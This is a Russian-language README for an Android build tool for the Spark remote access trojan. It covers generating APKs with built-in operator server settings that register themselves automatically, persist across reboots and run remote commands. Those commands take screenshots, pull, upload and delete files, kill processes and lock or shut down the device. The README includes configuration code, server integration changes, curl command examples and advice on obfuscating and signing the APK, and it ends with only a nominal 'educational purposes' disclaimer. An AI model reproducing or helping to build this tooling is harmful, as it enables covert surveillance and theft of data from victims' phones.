# Android Builder для Spark RAT

## Описание
Android Builder позволяет создавать Android APK клиентов для Spark RAT с вшитыми настройками подключения. Сгенерированный APK автоматически регистрируется на сервере и начинает выполнять команды.

## Структура проекта

### Android Builder
- `android-builder/android_generator.jsx` - React компонент для веб-интерфейса
- `android-builder/android_builder_api.py` - Python Flask API для генерации APK

### Android Client
- `android_template/` - шаблон Android проекта
- `app/src/main/java/com/spark/android/` - исходный код Android приложения
- `app/src/main/res/` - ресурсы Android приложения

## Функции Android клиента

### Основные возможности:
- **Авторегистрация** - устройство автоматически регистрируется на сервере при запуске
- **Heartbeat** - периодическая отправка состояния устройства каждые 30 секунд
- **Фоновый сервис** - работает как foreground service с уведомлением
- **Автозапуск** - автоматически запускается после перезагрузки устройства

### Поддерживаемые команды:
- `screenshot` - создание скриншота экрана
- `file/list` - просмотр файлов в директории
- `file/get` - скачивание файлов с устройства
- `file/upload` - загрузка файлов на устройство
- `file/remove` - удаление файлов
- `process/list` - список запущенных процессов
- `process/kill` - завершение процессов
- `lock` - блокировка экрана устройства
- `restart` - перезагрузка устройства
- `shutdown` - выключение устройства

## Сборка Android APK

### Требования:
1. **Android SDK** (API 26+)
2. **Android Studio** или **Android Build Tools**
3. **Java Development Kit** (JDK 8+)
4. **Python 3.8+** для Builder API
5. **Node.js** для веб-интерфейса

### Установка Android SDK:
```bash
# Установите Android SDK
# Скачайте с: https://developer.android.com/studio

# Установите переменную окружения
export ANDROID_HOME=/path/to/android-sdk
export PATH=$PATH:$ANDROID_HOME/tools:$ANDROID_HOME/platform-tools:$ANDROID_HOME/build-tools
```

### Запуск Android Builder:

#### 1. Установите зависимости Python:
```bash
cd android-builder
pip install -r requirements.txt
```

#### 2. Запустите API сервер:
```bash
python android_builder_api.py
```

#### 3. Запустите веб-интерфейс:
```bash
cd web
npm install
npm run build
# Скопируйте содержимое build/ в android-builder/
```

#### 4. Откройте веб-интерфейс:
```
http://localhost:8080
```

### Ручная сборка APK:

#### 1. Скопируйте шаблон:
```bash
cp -r android_template spark_android
cd spark_android
```

#### 2. Настройте конфигурацию:
Отредактируйте `app/src/main/java/com/spark/android/SparkConfig.java`:
```java
public class SparkConfig {
    public static final String SERVER_URL = "http://your-server:8000";
    public static final String USERNAME = "admin";
    public static final String PASSWORD = "your_password";
    public static final String DEVICE_NAME = "My Android Device";
    public static final String DEVICE_ID = "generated-device-id";
    public static final String ARCH = "arm64";
}
```

#### 3. Соберите APK:
```bash
cd android_template
./gradlew assembleRelease
```

APK будет создан в: `app/build/outputs/apk/release/app-release.apk`

## Интеграция с существующим Spark

### Обновление серверного кода:

#### 1. Добавьте поддержку Android в API:
В файле `client/core/modules.go` добавьте обработку Android-специфичных команд:

```go
case "android":
    switch action {
    case "screenshot":
        // Обработка скриншота для Android
    case "file/list":
        // Обработка файлов для Android
    case "lock":
        // Блокировка экрана Android
    }
```

#### 2. Обновите device/list API:
В файле `client/core/device.go` добавьте обработку Android устройств:

```go
type DeviceInfo struct {
    ID           string    `json:"id"`
    OS           string    `json:"os"`
    Arch         string    `json:"arch"`
    LAN          string    `json:"lan"`
    WAN          string    `json:"wan"`
    MAC          string    `json:"mac"`
    Net          NetInfo   `json:"net"`
    CPU          CPUInfo   `json:"cpu"`
    RAM          RAMInfo   `json:"ram"`
    Disk         DiskInfo  `json:"disk"`
    Uptime       int64     `json:"uptime"`
    Hostname     string    `json:"hostname"`
    Username     string    `json:"username"`
    Battery      int       `json:"battery,omitempty"`      // Android специфично
    StorageType  string    `json:"storage_type,omitempty"` // Android специфично
    NetworkType  string    `json:"network_type,omitempty"` // Android специфично
}
```

#### 3. Обновите веб-интерфейс:
В файле `web/src/components/generate/generate.jsx` добавьте опцию Android:

```jsx
const platforms = [
  { value: 'windows', label: 'Windows' },
  { value: 'linux', label: 'Linux' },
  { value: 'android', label: 'Android' }
];
```

### API Endpoints для Android:

#### Регистрация устройства:
```
POST /api/device/list
Authorization: Basic base64(username:password)
Content-Type: application/json

{
  "id": "device-id",
  "os": "android",
  "arch": "arm64",
  "hostname": "Samsung Galaxy S21",
  "username": "android-user"
}
```

#### Отправка команд:
```
POST /api/device/:action
Authorization: Basic base64(username:password)
Content-Type: application/json

{
  "device": "device-id",
  "parameters": {
    "path": "/sdcard/",
    "files": ["file1.txt"]
  }
}
```

## Тестирование

### Примеры curl запросов:

#### 1. Регистрация Android устройства:
```bash
curl -X POST http://localhost:8000/api/device/list \
  -H "Authorization: Basic $(echo -n 'admin:password' | base64)" \
  -H "Content-Type: application/json" \
  -d '{
    "id": "android-device-123",
    "os": "android",
    "arch": "arm64",
    "hostname": "Samsung Galaxy S21",
    "username": "android-user"
  }'
```

#### 2. Получение скриншота:
```bash
curl -X POST http://localhost:8000/api/device/screenshot/get \
  -H "Authorization: Basic $(echo -n 'admin:password' | base64)" \
  -H "Content-Type: application/json" \
  -d '{
    "device": "android-device-123"
  }'
```

#### 3. Список файлов:
```bash
curl -X POST http://localhost:8000/api/device/file/list \
  -H "Authorization: Basic $(echo -n 'admin:password' | base64)" \
  -H "Content-Type: application/json" \
  -d '{
    "device": "android-device-123",
    "path": "/sdcard/"
  }'
```

## Безопасность

### Рекомендации:
1. **Подпись APK** - используйте собственные сертификаты для подписи
2. **Обфускация** - включите обфускацию кода в release сборке
3. **Network Security** - используйте HTTPS для всех запросов
4. **Permissions** - минимизируйте количество запрашиваемых разрешений

### Настройка подписи:
Создайте keystore файл:
```bash
keytool -genkey -v -keystore spark-release-key.keystore -alias spark-key -keyalg RSA -keysize 2048 -validity 10000
```

Обновите `app/build.gradle`:
```gradle
android {
    signingConfigs {
        release {
            storeFile file('path/to/spark-release-key.keystore')
            storePassword 'your_store_password'
            keyAlias 'spark-key'
            keyPassword 'your_key_password'
        }
    }
}
```

## Troubleshooting

### Частые проблемы:

1. **"Android SDK not found"**
   - Установите Android SDK
   - Настройте переменную ANDROID_HOME

2. **"Build failed"**
   - Проверьте версию Gradle
   - Убедитесь что все зависимости доступны

3. **"Permission denied"**
   - Проверьте права на запись в директорию сборки
   - Запустите с правами администратора

4. **"Network timeout"**
   - Проверьте подключение к интернету
   - Убедитесь что сервер Spark запущен

### Логи:
- Android: `adb logcat | grep Spark`
- Builder API: логи в консоли Python
- Web Interface: логи браузера (F12)

## Лицензия
Этот проект предназначен для образовательных целей. Используйте ответственно и в соответствии с местным законодательством.